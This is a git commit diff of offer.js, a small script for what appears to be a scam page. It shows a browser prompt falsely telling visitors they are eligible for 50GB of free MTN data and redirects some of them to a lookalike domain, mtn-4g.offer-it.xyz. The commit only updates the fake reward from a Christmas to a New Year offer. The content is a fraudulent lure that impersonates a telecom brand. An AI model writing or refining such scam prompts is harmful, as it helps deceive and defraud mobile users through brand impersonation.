f492b286d48934245ff9428a005129d978fffc3b
uptomars <Kenoly555+me@gmail.com>
2026-01-04 10:07:09 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '50GB DATA'
-password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN CHRISTMAS REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
+password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN NEW YEAR REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
 if (password != '50GB DATA') {
 location.href='https://mtn-4g.offer-it.xyz/50GB';
 }
+
 
